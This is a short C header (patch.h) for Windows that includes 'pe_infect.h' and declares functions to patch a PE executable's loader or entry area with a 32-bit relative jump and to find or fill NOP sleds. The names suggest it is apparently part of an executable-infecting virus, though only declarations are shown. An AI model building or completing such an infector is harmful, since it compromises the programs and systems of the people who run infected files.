#ifndef PATCH_H_INCLUDED
#define PATCH_H_INCLUDED

#include <windows.h>

#include "pe_infect.h"

#define SIZEOF_X86_JMP32 5


void patchRelJMP(BYTE* buf, DWORD destVA);

BOOL bPatchLoader(const struct ParsedPE* ppe);

BOOL bPatchNearEntry(const struct ParsedPE* ppe);

int offFindNopsled(const BYTE* buf, SIZE_T szBuf, SIZE_T szNopsled);

void offFillNops(BYTE* buf, SIZE_T szFill);

#endif /* PATCH_H_INCLUDED */
